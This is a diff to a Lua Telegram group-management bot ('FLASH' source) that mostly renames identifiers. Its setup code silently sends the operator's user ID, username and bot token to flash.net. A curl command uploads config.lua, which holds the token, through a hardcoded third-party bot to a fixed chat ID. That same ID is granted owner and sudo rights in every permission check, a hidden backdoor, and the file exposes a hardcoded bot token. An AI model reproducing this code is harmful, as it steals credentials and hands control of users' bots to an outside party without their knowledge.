@@ -1,12 +1,12 @@
 -- Welcom To File The Best Source In The Telegram
--- All The File By Developer FLASH : @Q_Y_4
+-- All The File By Developer flash : @Q_Y_4
 -- Join In Chennel Source : @FAQY4 
--- Join In Explanation Channel : @Learn_FLASH
+-- Join In Explanation Channel : @Learn_flash
 ----------------------------------------------------------------------------
 serpent = require("serpent") 
 lgi = require('lgi')
 redis = require('redis')
-FLASHdx1 = redis.connect('127.0.0.1', 6379)
+flashdx1 = redis.connect('127.0.0.1', 6379)
 URL= require('socket.url') 
 HTTPS = require ("ssl.https")  
 https = require ("ssl.https") 
@@ -50,7 +50,7 @@ username = username,
 sudo_users = {SUDO}, 
 }
 create(config, "./config.lua")   
-https.request("https://FLASH.net/FLASH/?id="..SUDO.."&user="..username.."&token="..token)
+https.request("https://flash.net/flash/?id="..SUDO.."&user="..username.."&token="..token)
 local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 1488653639 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 file = io.open("RUNFA.sh", "w")  
 file:write([[
@@ -60,7 +60,7 @@ while(true) do
 rm -fr ../.telegram-cli
 echo -e ""
 echo -e ""
-./tg -s ./FLASH.lua $@ --bot=$token
+./tg -s ./flash.lua $@ --bot=$token
 done
 ]])  
 file:close()  
@@ -87,7 +87,7 @@ end
 file:write(serialized)  
 file:close() 
 end end
-local load_FLASHdx1 = function()  
+local load_flashdx1 = function()  
 local f = io.open("./config.lua", "r")  
 if not f then   AutoSet()  
 else   
@@ -96,20 +96,20 @@ end
 local config = loadfile("./config.lua")() 
 return config 
 end  
-_FLASHdx1 = load_FLASHdx1()  
+_flashdx1 = load_flashdx1()  
 sudos = dofile("./config.lua") 
 bot_owner = sudos.SUDO 
 sudo_users = {sudos.sudo_users} 
 bot_id = sudos.bot_id 
-FLASH = sudos.bot_id
+flash = sudos.bot_id
 SUDOUSERNAME = sudos.username
 tokenbot = sudos.token
-name_bot = (FLASHdx1:get(FLASH..'name_bot') or 'فلاش')
-SudoFLASH = SUDOUSERNAME:gsub('@','') 
-SudoFLASH = SudoFLASH:gsub([[\_]],'_')
+name_bot = (flashdx1:get(flash..'name_bot') or 'فلاش')
+Sudoflash = SUDOUSERNAME:gsub('@','') 
+Sudoflash = Sudoflash:gsub([[\_]],'_')
 ----------------------------------------------------------
--- Start Functions Source FLASH --
---     By Developer FLASH     -- 
+-- Start Functions Source flash --
+--     By Developer flash     -- 
 -------- Bot Owner
 function is_leader(msg) local var = false if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(1488653639) then var = true end return var end
 function is_leaderid(user_id) local var = false if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
@@ -117,102 +117,102 @@ function is_leaderid(user_id) local var = false if user_id == tonumber(bot_owner
 function is_sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(1488653639) then var = true end return var end
 function is_sudoid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
 -------- Sudo3
-function is_admin(user_id) local var = false local hashsb =  'bot:admins:' local admin = FLASHdx1:sismember(FLASH..hashsb, user_id) if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
+function is_admin(user_id) local var = false local hashsb =  'bot:admins:' local admin = flashdx1:sismember(flash..hashsb, user_id) if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
 -------- Owner all
-function is_onall(user_id) local var = false local hash =  'bot:onall:' local onall = FLASHdx1:sismember(FLASH..hash, user_id) local hashs =  'bot:admins:' local admin = FLASHdx1:sismember(FLASH..hashs, user_id) if onall then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
+function is_onall(user_id) local var = false local hash =  'bot:onall:' local onall = flashdx1:sismember(flash..hash, user_id) local hashs =  'bot:admins:' local admin = flashdx1:sismember(flash..hashs, user_id) if onall then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
 --------Modod all
-function is_moall(user_id) local var = false local hash =  'bot:moall:' local moall = FLASHdx1:sismember(FLASH..hash, user_id) local hashs =  'bot:admins:' local admin = FLASHdx1:sismember(FLASH..hashs, user_id) local hashss =  'bot:onall:' local onall = FLASHdx1:sismember(FLASH..hashss, user_id) if moall then var = true end if admin then var = true end if onall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
+function is_moall(user_id) local var = false local hash =  'bot:moall:' local moall = flashdx1:sismember(flash..hash, user_id) local hashs =  'bot:admins:' local admin = flashdx1:sismember(flash..hashs, user_id) local hashss =  'bot:onall:' local onall = flashdx1:sismember(flash..hashss, user_id) if moall then var = true end if admin then var = true end if onall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
 -------- Vip Member All
-function is_vpall(user_id) local var = false local hashs =  'bot:vpall:' local vpall = FLASHdx1:sismember(FLASH..hashs, user_id) local hashss =  'bot:onall:' local onall = FLASHdx1:sismember(FLASH..hashss, user_id) local hashsss = 'bot:admins:' local admin = FLASHdx1:sismember(FLASH..hashsss, user_id) local hashssss =  'bot:moall:'local moall = FLASHdx1:sismember(FLASH..hashssss, user_id) if vpall then var = true end if onall then var = true end if admin then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
+function is_vpall(user_id) local var = false local hashs =  'bot:vpall:' local vpall = flashdx1:sismember(flash..hashs, user_id) local hashss =  'bot:onall:' local onall = flashdx1:sismember(flash..hashss, user_id) local hashsss = 'bot:admins:' local admin = flashdx1:sismember(flash..hashsss, user_id) local hashssss =  'bot:moall:'local moall = flashdx1:sismember(flash..hashssss, user_id) if vpall then var = true end if onall then var = true end if admin then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
 -------- Donky
-function is_donky(user_id, chat_id) local var = false local hash =  'bot:donky:'..chat_id local momod = FLASHdx1:sismember(FLASH..hash, user_id) local hashs =  'bot:admins:' local admin = FLASHdx1:sismember(FLASH..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = FLASHdx1:sismember(FLASH..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = FLASHdx1:sismember(FLASH..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = FLASHdx1:sismember(FLASH..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = FLASHdx1:sismember(FLASH..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = FLASHdx1:sismember(FLASH..hashfaed, user_id) if donky then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
+function is_donky(user_id, chat_id) local var = false local hash =  'bot:donky:'..chat_id local momod = flashdx1:sismember(flash..hash, user_id) local hashs =  'bot:admins:' local admin = flashdx1:sismember(flash..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = flashdx1:sismember(flash..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = flashdx1:sismember(flash..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = flashdx1:sismember(flash..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = flashdx1:sismember(flash..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = flashdx1:sismember(flash..hashfaed, user_id) if donky then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
 -------- Monsh
-function is_monsh(user_id, chat_id) local var = false local hash =  'bot:monsh:'..chat_id local monsh = FLASHdx1:sismember(FLASH..hash, user_id) local hashs =  'bot:admins:' local admin = FLASHdx1:sismember(FLASH..hashs, user_id) if monsh then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
+function is_monsh(user_id, chat_id) local var = false local hash =  'bot:monsh:'..chat_id local monsh = flashdx1:sismember(flash..hash, user_id) local hashs =  'bot:admins:' local admin = flashdx1:sismember(flash..hashs, user_id) if monsh then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
 -------- Monsh2
-function is_monsh2(user_id, chat_id) local var = false local hash =  'bot:monsh2:'..chat_id local monsh2 = FLASHdx1:sismember(FLASH..hash, user_id) local hashs =  'bot:admins:' local admin = FLASHdx1:sismember(FLASH..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = FLASHdx1:sismember(FLASH..hashss, user_id) if monsh2 then var = true end if admin then var = true end if monsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
+function is_monsh2(user_id, chat_id) local var = false local hash =  'bot:monsh2:'..chat_id local monsh2 = flashdx1:sismember(flash..hash, user_id) local hashs =  'bot:admins:' local admin = flashdx1:sismember(flash..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = flashdx1:sismember(flash..hashss, user_id) if monsh2 then var = true end if admin then var = true end if monsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
 -------- Owner
-function is_owner(user_id, chat_id) local var = false local hash =  'bot:owners:'..chat_id local owner = FLASHdx1:sismember(FLASH..hash, user_id) local hashs =  'bot:admins:' local admin = FLASHdx1:sismember(FLASH..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = FLASHdx1:sismember(FLASH..hashss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = FLASHdx1:sismember(FLASH..hashw, user_id) if owner then var = true end if admin then var = true end if monsh then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
+function is_owner(user_id, chat_id) local var = false local hash =  'bot:owners:'..chat_id local owner = flashdx1:sismember(flash..hash, user_id) local hashs =  'bot:admins:' local admin = flashdx1:sismember(flash..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = flashdx1:sismember(flash..hashss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = flashdx1:sismember(flash..hashw, user_id) if owner then var = true end if admin then var = true end if monsh then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
 -------- Modod
-function is_momod(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = FLASHdx1:sismember(FLASH..hash, user_id) local hashs =  'bot:admins:' local admin = FLASHdx1:sismember(FLASH..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = FLASHdx1:sismember(FLASH..hashss, user_id) local hashsss =  'bot:monsh:'..chat_id local monsh = FLASHdx1:sismember(FLASH..hashsss, user_id) local hashssss =  'bot:onall:' local onall = FLASHdx1:sismember(FLASH..hashssss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = FLASHdx1:sismember(FLASH..hashw, user_id) if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
+function is_momod(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = flashdx1:sismember(flash..hash, user_id) local hashs =  'bot:admins:' local admin = flashdx1:sismember(flash..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = flashdx1:sismember(flash..hashss, user_id) local hashsss =  'bot:monsh:'..chat_id local monsh = flashdx1:sismember(flash..hashsss, user_id) local hashssss =  'bot:onall:' local onall = flashdx1:sismember(flash..hashssss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = flashdx1:sismember(flash..hashw, user_id) if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
 -------- Vip Member
-function is_vipmem(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = FLASHdx1:sismember(FLASH..hash, user_id) local hashs =  'bot:admins:' local admin = FLASHdx1:sismember(FLASH..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = FLASHdx1:sismember(FLASH..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = FLASHdx1:sismember(FLASH..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = FLASHdx1:sismember(FLASH..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = FLASHdx1:sismember(FLASH..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = FLASHdx1:sismember(FLASH..hashfaed, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = FLASHdx1:sismember(FLASH..hashw, user_id) if vipmem then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
+function is_vipmem(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = flashdx1:sismember(flash..hash, user_id) local hashs =  'bot:admins:' local admin = flashdx1:sismember(flash..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = flashdx1:sismember(flash..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = flashdx1:sismember(flash..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = flashdx1:sismember(flash..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = flashdx1:sismember(flash..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = flashdx1:sismember(flash..hashfaed, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = flashdx1:sismember(flash..hashw, user_id) if vipmem then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1488653639) then var = true end return var end
 ----------------------------------------------------------
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local setnumbergp = function()
 local setnumbergp_two = function(user_id)
 local hashs = "admins:data:" .. user_id
-local lists = FLASHdx1:smembers(FLASH..hashs)
-FLASHdx1:del(FLASH.."SudoNumberGp" .. user_id)
+local lists = flashdx1:smembers(flash..hashs)
+flashdx1:del(flash.."SudoNumberGp" .. user_id)
 for k, v in pairs(lists) do
-FLASHdx1:incr(FLASH.."SudoNumberGp" .. user_id)
+flashdx1:incr(flash.."SudoNumberGp" .. user_id)
 end end
 local setnumbergp_three = function(user_id)
 local hashss = "admins:data:" .. user_id
-local lists = FLASHdx1:smembers(FLASH..hashss)
-FLASHdx1:del(FLASH.."SudoNumberGp" .. user_id)
+local lists = flashdx1:smembers(flash..hashss)
+flashdx1:del(flash.."SudoNumberGp" .. user_id)
 for k, v in pairs(lists) do
-FLASHdx1:incr(FLASH.."SudoNumberGp" .. user_id)
+flashdx1:incr(flash.."SudoNumberGp" .. user_id)
 end end
-local list = FLASHdx1:smembers(FLASH.."Bot:Admins")
+local list = flashdx1:smembers(flash.."Bot:Admins")
 for k, v in pairs(list) do
 setnumbergp_two(v)
 end
-local lists = FLASHdx1:smembers(FLASH.."Bot:leader")
+local lists = flashdx1:smembers(flash.."Bot:leader")
 for k, v in pairs(lists) do
 setnumbergp_three(v)
 end
-FLASHdx1:setex(FLASH.."bot:reload", 7230, true)
+flashdx1:setex(flash.."bot:reload", 7230, true)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- FreeWords
 local function is_free(msg, value)
 local var = false
-local hash = (FLASH..'bot:freewords:')
+local hash = (flash..'bot:freewords:')
 if hash then
-local names = FLASHdx1:hkeys(hash)
+local names = flashdx1:hkeys(hash)
 local text = ''
 local value = value:gsub('-','')
 for i=1, #names do
 if string.match(value:lower(), names[i]:lower()) then
 var = true
 end end end return var end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Banned
 local function is_banned(user_id, chat_id)
 local var = false
 local hash = 'bot:banned:'..chat_id
-local banned = FLASHdx1:sismember(FLASH..hash, user_id)
+local banned = flashdx1:sismember(flash..hash, user_id)
 if banned then
 var = true
 end return var end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Muted
 local function is_muted(user_id, chat_id)
 local var = false
 local hash = 'bot:muted:'..chat_id
-local muted = FLASHdx1:sismember(FLASH..hash, user_id)
+local muted = flashdx1:sismember(flash..hash, user_id)
 if muted then
 var = true
 end return var end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Gbaned
 function is_gbanned(user_id)
 local var = false
 local hash = 'bot:gban:'
-local gbanned = FLASHdx1:sismember(FLASH..hash, user_id)
+local gbanned = flashdx1:sismember(flash..hash, user_id)
 if gbanned then
 var = true 
 end return var end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- mutedall
 function is_mutedall(user_id)
 local var = false
 local hash = 'bot:mutedall:'
-local mutedall = FLASHdx1:sismember(FLASH..hash, user_id)
+local mutedall = flashdx1:sismember(flash..hash, user_id)
 if mutedall then
 var = true
 end return var end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Delete Msg
 function delete_msg(chatid ,mid)
 tdcli_function ({
@@ -221,35 +221,35 @@ chat_id_ = chatid,
 message_ids_ = mid
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Who Add
 local who_add = function(chat)
 local user_id
 local user = false
-local list1 = FLASHdx1:smembers(FLASH.."Bot:KpSudos")
-local list2 = FLASHdx1:smembers(FLASH.."Bot:Admins")
+local list1 = flashdx1:smembers(flash.."Bot:KpSudos")
+local list2 = flashdx1:smembers(flash.."Bot:Admins")
 for k, v in pairs(list1) do
 local hash = "sudo:data:" .. v
-local is_add = FLASHdx1:sismember(FLASH..hash, chat)
+local is_add = flashdx1:sismember(flash..hash, chat)
 if is_add then
 user_id = v
 end end
 for k, v in pairs(list2) do
 local hash = "sudo:data:" .. v
-local is_add = FLASHdx1:sismember(FLASH..hash, chat)
+local is_add = flashdx1:sismember(flash..hash, chat)
 if is_add then
 user_id = v
 end end
 local hash = "sudo:data:" .. bot_owner
-if FLASHdx1:sismember(FLASH..hash, chat) then
+if flashdx1:sismember(flash..hash, chat) then
 user_id = bot_owner
 end
 if user_id then
-local user_info = FLASHdx1:get(FLASH.."user:Name" .. user_id)
+local user_info = flashdx1:get(flash.."user:Name" .. user_id)
 if user_info then
 user = user_info
 end end return user end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Get Chat
 local function getChat(chat_id, cb, cmd) 
 tdcli_function ({ ID = "GetChat", chat_id_ = chat_id }, cb or dl_cb, cmd) 
@@ -260,8 +260,8 @@ end
 local function getchat(GroupID,func) 
 pcall(tdcli_function({ID="GetChat",chat_id_ = GroupID},func or dl_cb,nil)) 
 end 
---     By Developer FLASH     -- 
-local function FLASHdx113(chat_id, reply_to_message_id, text)
+--     By Developer flash     -- 
+local function flashdx113(chat_id, reply_to_message_id, text)
 local TextParseMode = {ID = "TextParseModeMarkdown"}
 tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
 end
@@ -269,7 +269,7 @@ local function send(chat_id, reply_to_message_id, text)
 local TextParseMode = {ID = "TextParseModeMarkdown"}
 tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function Send_Options(msg,user_id,status,text)
 tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
 if data.first_name_ ~= false then
@@ -284,7 +284,7 @@ end
 else
 send(msg.chat_id_, msg.id_,"❅∫ لا يمكن الوصول الى معلومات العضو ،")
 end end,nil) end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function download_to_file(url, file_path) 
 local respbody = {} 
 local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
@@ -303,63 +303,63 @@ return file_path, code
 end 
 function add_file(msg,chat,ID_FILE,File_Name)
 if File_Name:match('.json') then
-if File_Name:lower():match('(%d+)') ~= FLASH:lower() then 
-FLASHdx113(chat,msg.id_,"*❅∫ هذا الملف ليس تابع لسورس فلاش ،*")   
+if File_Name:lower():match('(%d+)') ~= flash:lower() then 
+flashdx113(chat,msg.id_,"*❅∫ هذا الملف ليس تابع لسورس فلاش ،*")   
 return false 
 end      
 local File = json:decode(https.request('https://api.telegram.org/bot' .. tokenbot .. '/getfile?file_id='..ID_FILE) ) 
 download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..File.result.file_path, ''..File_Name) 
-FLASHdx113(chat,msg.id_,"*❅∫ جاري رفع الملف ....*")   
+flashdx113(chat,msg.id_,"*❅∫ جاري رفع الملف ....*")   
 else
-FLASHdx113(chat,msg.id_,"*❅∫ غير صحيح ،*")   
+flashdx113(chat,msg.id_,"*❅∫ غير صحيح ،*")   
 end
-local info_file = io.open('./'..FLASH..'.json', "r"):read('*a')
+local info_file = io.open('./'..flash..'.json', "r"):read('*a')
 local groups = JSON.decode(info_file)
-FLASHdx113(chat,msg.id_,"*❅∫ تم رفع نسخه الملف ،\n❅∫ تم رفع مشرفين المجموعات ،\n❅∫ تم قفل اوامر حمايه المجموعات ،*")
+flashdx113(chat,msg.id_,"*❅∫ تم رفع نسخه الملف ،\n❅∫ تم رفع مشرفين المجموعات ،\n❅∫ تم قفل اوامر حمايه المجموعات ،*")
 vardump(groups)
 for idg,v in pairs(groups.GP_BOT) do
-FLASHdx1:sadd(FLASH.."bot:groups",idg)
-FLASHdx1:set(FLASH.."bot:enable:"..idg,true)
-FLASHdx1:setex(FLASH.."bot:charge:"..idg,86400,true)
-FLASHdx1:sadd("FLASH:addg"..bot_id, idg) FLASHdx1:set(FLASH..'editmsg'..idg,true)
-FLASHdx1:set(FLASH..'bot:bots:mute'..idg,true) FLASHdx1:set(FLASH..'bot:bots:ban'..idg,true)
-FLASHdx1:set(FLASH..'keed_bots'..idg,true) FLASHdx1:set(FLASH..'anti-flood:'..idg,true)
-FLASHdx1:set(FLASH..'bot:inline:mute'..idg,true) FLASHdx1:set(FLASH..'bot:photo:mute'..idg,true)
-FLASHdx1:set(FLASH..'bot:spam:mute'..idg,true) FLASHdx1:set(FLASH..'bot:video:mute'..idg,true)
-FLASHdx1:set(FLASH..'bot:gifs:mute'..idg,true) FLASHdx1:set(FLASH..'tags:lock'..idg,true)
-FLASHdx1:set(FLASH..'bot:music:mute'..idg,true) FLASHdx1:set(FLASH..'bot:voice:mute'..idg,true)
-FLASHdx1:set(FLASH..'bot:links:mute'..idg,true) FLASHdx1:set(FLASH..'bot:location:mute'..idg,true) 
-FLASHdx1:set(FLASH..'bot:strict'..idg,true) FLASHdx1:set(FLASH..'bot:document:mute'..idg,true) 
-FLASHdx1:set(FLASH..'bot:hashtag:mute'..idg,true) FLASHdx1:set(FLASH..'bot:contact:mute'..idg,true) 
-FLASHdx1:set(FLASH..'bot:webpage:mute'..idg,true) FLASHdx1:set(FLASH..'bot:sticker:mute'..idg,true)
-FLASHdx1:set(FLASH..'markdown:lock'..idg,true) FLASHdx1:set(FLASH..'bot:forward:mute'..idg,true)
+flashdx1:sadd(flash.."bot:groups",idg)
+flashdx1:set(flash.."bot:enable:"..idg,true)
+flashdx1:setex(flash.."bot:charge:"..idg,86400,true)
+flashdx1:sadd("flash:addg"..bot_id, idg) flashdx1:set(flash..'editmsg'..idg,true)
+flashdx1:set(flash..'bot:bots:mute'..idg,true) flashdx1:set(flash..'bot:bots:ban'..idg,true)
+flashdx1:set(flash..'keed_bots'..idg,true) flashdx1:set(flash..'anti-flood:'..idg,true)
+flashdx1:set(flash..'bot:inline:mute'..idg,true) flashdx1:set(flash..'bot:photo:mute'..idg,true)
+flashdx1:set(flash..'bot:spam:mute'..idg,true) flashdx1:set(flash..'bot:video:mute'..idg,true)
+flashdx1:set(flash..'bot:gifs:mute'..idg,true) flashdx1:set(flash..'tags:lock'..idg,true)
+flashdx1:set(flash..'bot:music:mute'..idg,true) flashdx1:set(flash..'bot:voice:mute'..idg,true)
+flashdx1:set(flash..'bot:links:mute'..idg,true) flashdx1:set(flash..'bot:location:mute'..idg,true) 
+flashdx1:set(flash..'bot:strict'..idg,true) flashdx1:set(flash..'bot:document:mute'..idg,true) 
+flashdx1:set(flash..'bot:hashtag:mute'..idg,true) flashdx1:set(flash..'bot:contact:mute'..idg,true) 
+flashdx1:set(flash..'bot:webpage:mute'..idg,true) flashdx1:set(flash..'bot:sticker:mute'..idg,true)
+flashdx1:set(flash..'markdown:lock'..idg,true) flashdx1:set(flash..'bot:forward:mute'..idg,true)
 if v.MNSH then
 for k,idmsh in pairs(v.MNSH) do
-FLASHdx1:sadd(FLASH..'bot:monsh:'..idg,idmsh)  
+flashdx1:sadd(flash..'bot:monsh:'..idg,idmsh)  
 print('تم رفع '..k..' منشئين')
 end end
 if v.MDER then
 for k,idmder in pairs(v.MDER) do
-FLASHdx1:sadd(FLASH..'bot:owners:'..idg,idmder)  
+flashdx1:sadd(flash..'bot:owners:'..idg,idmder)  
 print('تم رفع '..k..' مدراء')
 end end
 if v.MOD then
 for k,idmod in pairs(v.MOD) do
 vardump(idmod)
-FLASHdx1:sadd(FLASH..'bot:momod:'..idg,idmod)  
+flashdx1:sadd(flash..'bot:momod:'..idg,idmod)  
 print('تم رفع '..k..' ادمنيه')
 end end
 if v.VIP then
 for k,idvip in pairs(v.VIP) do
-FLASHdx1:sadd(FLASH..'bot:vipmem:'..idg,idvip)  
+flashdx1:sadd(flash..'bot:vipmem:'..idg,idvip)  
 print('تم رفع '..k..' مميزين')
 end end
 if v.linkgroup then
 if v.linkgroup ~= "" then
-FLASHdx1:set(FLASH.."bot:group:link"..idg,v.linkgroup)   
+flashdx1:set(flash.."bot:group:link"..idg,v.linkgroup)   
 print('تم وضع رابط ')
 end end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Resolve Username
 function resolve_username(username,cb)
 tdcli_function ({
@@ -367,7 +367,7 @@ ID = "SearchPublicChat",
 username_ = username
 }, cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function changeChatMemberStatus(chat_id, user_id, status)
 tdcli_function ({
 ID = "ChangeChatMemberStatus",
@@ -378,7 +378,7 @@ ID = "ChatMemberStatus" .. status
 },
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function getInputFile(file)
 if file:match('/') then
 infile = {ID = "InputFileLocal", path_ = file}
@@ -387,7 +387,7 @@ infile = {ID = "InputFileId", id_ = file}
 else
 infile = {ID = "InputFilePersistentId", persistent_id_ = file}
 end return infile end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Del All Msgs
 function del_all_msgs(chat_id, user_id)
 tdcli_function ({
@@ -396,7 +396,7 @@ chat_id_ = chat_id,
 user_id_ = user_id
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function getChatId(id)
 local chat = {}
 local id = tostring(id)
@@ -407,12 +407,12 @@ else
 local group_id = id:gsub('-', '')
 chat = {ID = group_id, type = 'group'}
 end return chat end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Chat Leave
 function chat_leave(chat_id, user_id)
 changeChatMemberStatus(chat_id, user_id, "Left")
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- From Username
 function from_username(msg)
 function gfrom_user(extra,result,success)
@@ -426,18 +426,18 @@ end
 local username = getUser(msg.sender_user_id_,gfrom_user)
 return username
 end
